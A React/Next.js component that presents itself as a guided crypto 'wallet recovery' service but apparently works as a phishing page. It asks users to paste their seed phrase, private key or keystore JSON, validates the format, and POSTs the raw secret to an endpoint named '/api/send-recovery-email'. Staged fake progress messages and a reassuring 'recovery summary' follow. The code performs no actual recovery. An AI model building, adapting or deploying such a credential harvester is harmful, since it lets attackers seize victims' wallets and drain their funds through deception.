'use client'

import { useCallback, useEffect, useMemo, useState } from 'react'
import { useRouter } from 'next/navigation'

type RecoveryStage = 'idle' | 'initializing' | 'chooseConnection' | 'enterSecret' | 'reviewing' | 'success' | 'error'
type ConnectionType = 'Secret Phrase' | 'Keystore' | 'Private Key'

type RecoveryIssue = {
  id: string
  title: string
  description: string
  badge: string
  summary: string
}

const issueOptions: RecoveryIssue[] = [
  { id: 'key-management', title: 'Access & Key Recovery', description: 'Resolve issues around recovery phrases, key handling, unlock failures, and account access that block the return to your wallet.', badge: 'Access', summary: 'Built for lockout moments, recovery phrase confusion, and backup material that needs a second look.' },
  { id: 'network-transaction', title: 'Transaction Recovery', description: 'Work through pending transactions, fee mismatches, and RPC instability that interrupt wallet activity or restoration steps.', badge: 'Network', summary: 'Built for stuck sends, unreliable confirmations, and transaction history that no longer lines up.' },
  { id: 'smart-contract', title: 'Token & Contract Repair', description: 'Review approval problems, contract interaction failures, and token behavior that interferes with moving or restoring assets.', badge: 'Contract', summary: 'Built for failed token actions, unsafe permissions, and contract requests that deserve closer review.' },
  { id: 'ui-ux', title: 'Interface Recovery Path', description: 'Untangle confusing wallet prompts, stale balances, and broken interface states that keep the recovery process from moving forward.', badge: 'Interface', summary: 'Built for inconsistent UI state, misleading prompts, and recovery steps that do not match what the wallet shows.' },
  { id: 'integration-api', title: 'Service & API Recovery', description: 'Diagnose upstream service failures, RPC outages, and third-party dependencies that are blocking the expected recovery path.', badge: 'Services', summary: 'Built for timeouts, failed lookups, and external services that make wallet state feel unreliable.' },
  { id: 'storage-persistence', title: 'Backup & Persistence Repair', description: 'Investigate backup integrity, local storage issues, and missing session data when wallet state does not persist the way it should.', badge: 'Storage', summary: 'Built for wiped state, backup uncertainty, and restore attempts that keep losing context.' },
  { id: 'cross-chain', title: 'Multi-Chain Recovery', description: 'Trace mismatched networks, bridge state, and cross-chain activity when the wallet appears correct on one chain and broken on another.', badge: 'Cross-chain', summary: 'Built for wrong-network confusion, bridging issues, and assets that feel stranded between chains.' },
  { id: 'vulnerabilities', title: 'Compromise Review', description: 'Review suspicious activity, unsafe authorizations, and compromise signals before taking the next recovery action.', badge: 'Security', summary: 'Built for moments when wallet behavior changes suddenly and trust in the current state has dropped.' },
]

const connectionTypes: ConnectionType[] = ['Secret Phrase', 'Keystore', 'Private Key']
const initializingSteps = ['Preparing the recovery workspace', 'Confirming the selected issue path', 'Loading the recovery checklist']
const reviewingSteps = ['Validating the submitted format', 'Processing the recovery request', 'Preparing the recovery summary']
const wizardSteps = ['Issue', 'Method', 'Input', 'Result'] as const

const validateConnectionInput = (type: ConnectionType, value: string) => {
  const trimmed = value.trim()
  if (type === 'Secret Phrase') return trimmed.split(/\s+/).filter(Boolean).length >= 12 && trimmed.split(/\s+/).filter(Boolean).length <= 24
  if (type === 'Private Key') return /^(0x)?[A-Fa-f0-9]{64}$/.test(trimmed)
  if (type === 'Keystore') {
    try {
      const parsed = JSON.parse(trimmed)
      return typeof parsed === 'object' && parsed !== null && 'crypto' in parsed
    } catch {
      return false
    }
  }
  return false
}

const getStepIndex = (flowStep: RecoveryStage) => {
  switch (flowStep) {
    case 'idle':
      return 0
    case 'initializing':
      return 0
    case 'chooseConnection':
      return 1
    case 'enterSecret':
      return 2
    case 'reviewing':
    case 'success':
    case 'error':
      return 3
    default:
      return 0
  }
}

const RecoveryGlyph = ({ kind }: { kind: 'shield' | 'key' | 'file' | 'vault' | 'check' | 'alert' }) => {
  const iconMap = {
    shield: <path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" />,
    key: <><circle cx="8.5" cy="12" r="2.5" /><path d="M11 12h9M17 12v2M20 12v2" /></>,
    file: <><path d="M8 3h6l4 4v14H8z" /><path d="M14 3v5h5" /></>,
    vault: <><rect x="4" y="5" width="16" height="14" rx="3" /><circle cx="12" cy="12" r="2.5" /><path d="M12 9.5v5" /></>,
    check: <><path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" /><path d="M9.5 12.5l1.7 1.7 3.3-4" /></>,
    alert: <><path d="M12 4l8 14H4L12 4z" /><path d="M12 9v4" /><path d="M12 16h.01" /></>,
  }

  return (
    <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      {iconMap[kind]}
    </svg>
  )
}

export const WalletRestoration = () => {
  const [flowStep, setFlowStep] = useState<RecoveryStage>('idle')
  const [activeIssue, setActiveIssue] = useState<RecoveryIssue | null>(null)
  const [selectedConnection, setSelectedConnection] = useState<ConnectionType | null>(null)
  const [connectionInput, setConnectionInput] = useState('')
  const [inputError, setInputError] = useState('')
  const [activityMessage, setActivityMessage] = useState(initializingSteps[0])
  const [progressIndex, setProgressIndex] = useState(0)
  const [resultSummary, setResultSummary] = useState<string[]>([])
  const [message, setMessage] = useState('')
  const router = useRouter()

  const activeMessages = useMemo(() => {
    if (flowStep === 'initializing') return initializingSteps
    if (flowStep === 'reviewing') return reviewingSteps
    return []
  }, [flowStep])

  const stepIndex = getStepIndex(flowStep)
  const progressWidth = activeMessages.length > 0 ? ((progressIndex + 1) / activeMessages.length) * 100 : 0
  const canContinue = Boolean(selectedConnection && validateConnectionInput(selectedConnection, connectionInput))

  const handleExit = () => {
    setFlowStep('idle')
    setActiveIssue(null)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setResultSummary([])
    setMessage('')
    setActivityMessage(initializingSteps[0])
    setProgressIndex(0)
  }

  useEffect(() => {
    if (flowStep === 'idle') return

    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') handleExit()
    }

    window.addEventListener('keydown', handleKeyDown)
    return () => window.removeEventListener('keydown', handleKeyDown)
  }, [flowStep])

  useEffect(() => {
    if (flowStep !== 'initializing' && flowStep !== 'reviewing') return

    const messages = flowStep === 'initializing' ? initializingSteps : reviewingSteps
    let currentIndex = 0
    const timers: NodeJS.Timeout[] = []

    const tick = () => {
      currentIndex += 1
      if (currentIndex < messages.length) {
        timers.push(setTimeout(() => {
          setActivityMessage(messages[currentIndex])
          setProgressIndex(currentIndex)
          tick()
        }, 1500))
        return
      }

      if (flowStep === 'initializing') {
        timers.push(setTimeout(() => setFlowStep('chooseConnection'), 700))
      }
    }

    timers.push(setTimeout(tick, 1500))
    return () => timers.forEach(clearTimeout)
  }, [flowStep])

  const submitRecovery = useCallback(async () => {
    if (!activeIssue || !selectedConnection) {
      setFlowStep('error')
      setMessage('The recovery flow was interrupted. Please start again.')
      return
    }

    const startTime = Date.now()

    try {
      const timestamp = new Date().toISOString()
      const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'

      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          issueId: activeIssue.id,
          issueTitle: activeIssue.title,
          issueDescription: activeIssue.description,
          issueSummary: activeIssue.summary,
          selectedConnection,
          method,
          data: connectionInput.trim(),
          timestamp,
        }),
      })

      if (!response.ok) {
        const errorResponse = await response.text()
        throw new Error(errorResponse || 'Failed to process recovery details')
      }

      const elapsed = Date.now() - startTime
      if (elapsed < 2200) {
        await new Promise((resolve) => setTimeout(resolve, 2200 - elapsed))
      }

      setResultSummary([
        `Recovery path: ${activeIssue.title}`,
        `Verification mode: ${selectedConnection}`,
        `Input type validated: ${method}`,
        activeIssue.summary,
      ])
      setMessage('The recovery request was processed and the summary is ready.')
      setFlowStep('success')

      setTimeout(() => {
        router.push(`/recovery/success?issue=${activeIssue.id}&method=${method}&time=${encodeURIComponent(timestamp)}`)
      }, 1800)
    } catch (err) {
      setFlowStep('error')
      setMessage(err instanceof Error ? err.message : 'Recovery processing failed')
    }
  }, [activeIssue, connectionInput, router, selectedConnection])

  const handleIssueSelect = (issue: RecoveryIssue) => {
    setActiveIssue(issue)
    setActivityMessage(initializingSteps[0])
    setProgressIndex(0)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setResultSummary([])
    setMessage('')
    setFlowStep('initializing')
  }

  const handleConnectionSelect = (type: ConnectionType) => {
    setSelectedConnection(type)
    setConnectionInput('')
    setInputError('')
    setFlowStep('enterSecret')
  }

  const handleContinue = () => {
    if (!selectedConnection) return

    if (!validateConnectionInput(selectedConnection, connectionInput)) {
      setInputError(
        selectedConnection === 'Secret Phrase'
          ? 'Enter a valid 12 to 24 word recovery phrase.'
          : selectedConnection === 'Private Key'
            ? 'Enter a valid 64-character hex private key.'
            : 'Enter a valid keystore JSON object.'
      )
      return
    }

    setInputError('')
    setActivityMessage(reviewingSteps[0])
    setProgressIndex(0)
    setFlowStep('reviewing')
    void submitRecovery()
  }

  const inputHint =
    selectedConnection === 'Secret Phrase'
      ? 'Paste the phrase using spaces between each word.'
      : selectedConnection === 'Private Key'
        ? 'Paste the full private key with or without the 0x prefix.'
        : 'Paste the full encrypted keystore JSON object.'

  return (
    <div className="space-y-6">
      <section className={`rounded-[30px] border border-white/10 bg-slate-950/90 p-5 shadow-[0_32px_80px_-54px_rgba(16,185,129,0.28)] transition sm:p-7 ${flowStep !== 'idle' ? 'opacity-35 saturate-50' : 'opacity-100'}`}>
        <div className="grid gap-5 lg:grid-cols-[1.35fr_0.85fr]">
          <div className="space-y-5">
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.3em] text-emerald-300">Wallet Recovery</p>
              <h1 className="mt-3 text-3xl font-semibold text-white sm:text-4xl">Restore access with a guided wallet recovery workflow</h1>
              <p className="mt-3 max-w-2xl text-sm leading-7 text-slate-400 sm:text-base">
                Move through access issues, failed restore attempts, backup problems, and compromise concerns with a workflow designed to reduce confusion when the stakes are high.
              </p>
            </div>

            <div className="grid gap-3 sm:grid-cols-3">
              {[
                'Access and backup recovery',
                'Transaction and network repair',
                'Compromise and approval review',
              ].map((item) => (
                <div key={item} className="rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-medium text-slate-200">
                  {item}
                </div>
              ))}
            </div>
          </div>

          <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-1">
            <div className="rounded-[24px] border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.28em] text-slate-400">Works best for</p>
              <p className="mt-3 text-sm leading-6 text-slate-300">Regaining access, checking backup material, resolving blocked transaction paths, and responding carefully to suspicious wallet behavior.</p>
            </div>
            <div className="rounded-[24px] border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.28em] text-slate-400">Recovery outcome</p>
              <p className="mt-3 text-sm leading-6 text-slate-300">Generate a clear recovery summary tied to the selected issue path, available material, and next review step.</p>
            </div>
          </div>
        </div>

        <div className="mt-6 grid gap-4 xl:grid-cols-2">
          {issueOptions.map((issue) => (
            <button
              key={issue.id}
              type="button"
              onClick={() => handleIssueSelect(issue)}
              className="group rounded-[26px] border border-white/10 bg-white/5 p-5 text-left transition hover:-translate-y-0.5 hover:border-emerald-400/30 hover:bg-white/8"
            >
              <div className="flex items-start gap-4">
                <span className="inline-flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-emerald-400/20 bg-emerald-500/10 text-emerald-300">
                  <RecoveryGlyph kind="shield" />
                </span>
                <div className="min-w-0 flex-1">
                  <div className="flex flex-wrap items-center gap-3">
                    <span className="text-xs font-semibold uppercase tracking-[0.26em] text-emerald-300">{issue.badge}</span>
                    <span className="rounded-full border border-white/10 bg-slate-900/80 px-2.5 py-1 text-[11px] text-slate-300">Guided repair path</span>
                  </div>
                  <h2 className="mt-3 text-lg font-semibold text-white">{issue.title}</h2>
                  <p className="mt-2 text-sm leading-6 text-slate-400">{issue.description}</p>
                  <p className="mt-4 text-sm text-slate-300">{issue.summary}</p>
                </div>
              </div>
            </button>
          ))}
        </div>
      </section>

      {flowStep !== 'idle' && (
        <div className="fixed inset-0 z-50 bg-slate-950/78 backdrop-blur-md">
          <div className="flex h-[100dvh] items-end sm:items-center sm:justify-center">
            <div className="flex h-[100dvh] w-full flex-col overflow-hidden border border-white/10 bg-slate-950/98 shadow-2xl shadow-slate-950/60 sm:h-auto sm:max-h-[90vh] sm:max-w-3xl sm:rounded-[32px]">
              <div className="border-b border-white/10 bg-slate-950/95 px-4 pb-4 pt-4 sm:px-6">
                <div className="flex items-start justify-between gap-4">
                  <div className="min-w-0">
                    <p className="text-xs uppercase tracking-[0.28em] text-emerald-300">Recovery wizard</p>
                    <h2 className="mt-2 text-2xl font-semibold text-white">{activeIssue?.title ?? 'Wallet recovery'}</h2>
                    <p className="mt-2 text-sm leading-6 text-slate-400">
                      {activeIssue?.description ?? 'Follow the next step to continue the recovery flow.'}
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={handleExit}
                    className="inline-flex h-11 w-11 shrink-0 items-center justify-center rounded-full border border-white/10 bg-white/5 text-slate-200 transition hover:bg-white/10"
                    aria-label="Close recovery wizard"
                  >
                    X
                  </button>
                </div>

                <div className="mt-5 grid grid-cols-4 gap-2">
                  {wizardSteps.map((step, index) => {
                    const active = index === stepIndex
                    const complete = index < stepIndex
                    return (
                      <div
                        key={step}
                        className={`rounded-2xl border px-3 py-2 text-center text-[11px] font-semibold uppercase tracking-[0.18em] ${
                          active
                            ? 'border-emerald-400/40 bg-emerald-500/12 text-white'
                            : complete
                              ? 'border-emerald-400/20 bg-emerald-500/10 text-emerald-200'
                              : 'border-white/10 bg-white/5 text-slate-500'
                        }`}
                      >
                        {step}
                      </div>
                    )
                  })}
                </div>
              </div>

              <div className="flex-1 overflow-y-auto px-4 py-5 sm:px-6 sm:py-6">
                {flowStep === 'initializing' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-emerald-400/20 bg-emerald-500/10 p-5 sm:p-6">
                      <div className="flex items-center gap-4">
                        <span className="inline-flex h-14 w-14 items-center justify-center rounded-2xl border border-emerald-400/20 bg-slate-900/80 text-emerald-300">
                          <RecoveryGlyph kind="shield" />
                        </span>
                        <div>
                          <p className="text-sm font-semibold text-white">Preparing the recovery path</p>
                          <p className="mt-1 text-sm text-slate-400">{activityMessage}</p>
                        </div>
                      </div>
                      <div className="mt-5 rounded-full bg-slate-800/90 p-1">
                        <div className="h-2 rounded-full bg-emerald-400 transition-all" style={{ width: `${Math.max(progressWidth, 20)}%` }} />
                      </div>
                    </div>

                    <div className="grid gap-3">
                      {activeMessages.map((message, index) => (
                        <div
                          key={message}
                          className={`rounded-[22px] border p-4 transition ${progressIndex >= index ? 'border-emerald-400/25 bg-white/7 text-white' : 'border-white/10 bg-white/5 text-slate-400'}`}
                        >
                          <p className="text-xs uppercase tracking-[0.24em] text-slate-500">Stage {index + 1}</p>
                          <p className="mt-2 text-sm font-medium">{message}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'chooseConnection' && (
                  <div className="space-y-5">
                    <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                      <p className="text-sm text-slate-300">Choose the verification method that matches the backup or restore material currently available to you.</p>
                    </div>

                    <div className="grid gap-4 sm:grid-cols-3">
                      {connectionTypes.map((type) => (
                        <button
                          key={type}
                          type="button"
                          onClick={() => handleConnectionSelect(type)}
                          className="rounded-[24px] border border-white/10 bg-white/5 p-5 text-left transition hover:border-emerald-400/35 hover:bg-white/8"
                        >
                          <span className="inline-flex h-11 w-11 items-center justify-center rounded-2xl border border-emerald-400/20 bg-emerald-500/10 text-emerald-300">
                            <RecoveryGlyph kind={type === 'Secret Phrase' ? 'key' : type === 'Keystore' ? 'file' : 'vault'} />
                          </span>
                          <p className="mt-4 text-base font-semibold text-white">{type}</p>
                          <p className="mt-2 text-sm leading-6 text-slate-400">
                            {type === 'Secret Phrase'
                              ? 'Best when the recovery phrase is the backup you are working from.'
                              : type === 'Keystore'
                                ? 'Best when you have an encrypted keystore file or JSON export.'
                                : 'Best when the private key is the only recovery material available.'}
                          </p>
                        </button>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'enterSecret' && selectedConnection && (
                  <div className="space-y-5">
                    <div className="grid gap-4 lg:grid-cols-[1.2fr_0.8fr]">
                      <div className="rounded-[26px] border border-white/10 bg-white/5 p-5">
                        <p className="text-xs uppercase tracking-[0.26em] text-emerald-300">Recovery input</p>
                        <h3 className="mt-3 text-xl font-semibold text-white">{selectedConnection}</h3>
                        <p className="mt-2 text-sm leading-6 text-slate-400">{inputHint}</p>

                        <textarea
                          value={connectionInput}
                          onChange={(event) => {
                            setConnectionInput(event.target.value)
                            setInputError('')
                          }}
                          placeholder={selectedConnection === 'Secret Phrase' ? 'word1 word2 word3 ...' : selectedConnection === 'Private Key' ? '0x...' : '{ "crypto": { ... } }'}
                          className="mt-5 min-h-[220px] w-full rounded-[24px] border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-emerald-400 focus:outline-none focus:ring-2 focus:ring-emerald-400/20"
                        />
                        {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}
                      </div>

                      <div className="space-y-4">
                        <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                          <p className="text-xs uppercase tracking-[0.26em] text-slate-400">Before you continue</p>
                          <ul className="mt-4 space-y-3 text-sm text-slate-300">
                            <li>Use the exact format expected by the selected method.</li>
                            <li>Double-check spacing, braces, and any key prefix before continuing.</li>
                            <li>Review the final recovery summary before opening another request.</li>
                          </ul>
                        </div>
                        <button
                          type="button"
                          onClick={() => {
                            setFlowStep('chooseConnection')
                            setInputError('')
                            setMessage('')
                            setConnectionInput('')
                          }}
                          className="w-full rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-semibold text-slate-200 transition hover:bg-white/10"
                        >
                          Change verification mode
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                {flowStep === 'reviewing' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-emerald-400/20 bg-emerald-500/10 p-6 text-center">
                      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl border border-emerald-400/20 bg-slate-900/80 text-emerald-300">
                        <RecoveryGlyph kind="vault" />
                      </div>
                      <h3 className="mt-4 text-2xl font-semibold text-white">Recovery review in progress</h3>
                      <p className="mt-2 text-sm text-slate-400">{activityMessage}</p>
                      <div className="mt-5 rounded-full bg-slate-800/90 p-1">
                        <div className="h-2 rounded-full bg-emerald-400 transition-all" style={{ width: `${Math.max(progressWidth, 22)}%` }} />
                      </div>
                    </div>

                    <div className="grid gap-3">
                      {activeMessages.map((message, index) => (
                        <div key={message} className={`rounded-[22px] border p-4 ${progressIndex >= index ? 'border-emerald-400/25 bg-white/7 text-white' : 'border-white/10 bg-white/5 text-slate-400'}`}>
                          <p className="text-sm">{message}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'success' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-emerald-500/20 bg-emerald-500/10 p-5 sm:p-6">
                      <div className="flex items-start gap-4">
                        <span className="inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-500/10 text-emerald-300">
                          <RecoveryGlyph kind="check" />
                        </span>
                        <div>
                          <h3 className="text-xl font-semibold text-white">Recovery summary ready</h3>
                          <p className="mt-2 text-sm text-slate-300">{message}</p>
                        </div>
                      </div>
                    </div>

                    <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                      <p className="text-sm font-semibold text-white">Summary</p>
                      <ul className="mt-4 space-y-3 text-sm text-slate-300">
                        {resultSummary.map((line) => (
                          <li key={line} className="flex items-start gap-3">
                            <span className="mt-1 text-emerald-300">-</span>
                            <span>{line}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                )}

                {flowStep === 'error' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-rose-500/20 bg-rose-500/10 p-5 sm:p-6">
                      <div className="flex items-start gap-4">
                        <span className="inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-rose-500/10 text-rose-300">
                          <RecoveryGlyph kind="alert" />
                        </span>
                        <div>
                          <h3 className="text-xl font-semibold text-white">The recovery flow could not finish</h3>
                          <p className="mt-2 text-sm text-slate-300">{message}</p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              <div className="border-t border-white/10 bg-slate-950/95 px-4 py-4 pb-[calc(1rem+env(safe-area-inset-bottom))] sm:px-6">
                <div className="flex flex-col gap-3 sm:flex-row sm:justify-between">
                  <button
                    type="button"
                    onClick={handleExit}
                    className="rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-semibold text-slate-200 transition hover:bg-white/10"
                  >
                    {flowStep === 'success' || flowStep === 'error' ? 'Close wizard' : 'Cancel'}
                  </button>

                  {flowStep === 'enterSecret' && (
                    <button
                      type="button"
                      onClick={handleContinue}
                      disabled={!canContinue}
                      className="rounded-2xl bg-emerald-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-emerald-300 disabled:cursor-not-allowed disabled:opacity-50"
                    >
                      Review recovery input
                    </button>
                  )}

                  {flowStep === 'success' && (
                    <button
                      type="button"
                      onClick={handleExit}
                      className="rounded-2xl bg-emerald-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-emerald-300"
                    >
                      Start new recovery
                    </button>
                  )}

                  {flowStep === 'error' && (
                    <button
                      type="button"
                      onClick={() => setFlowStep('chooseConnection')}
                      className="rounded-2xl bg-rose-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-rose-300"
                    >
                      Try again
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
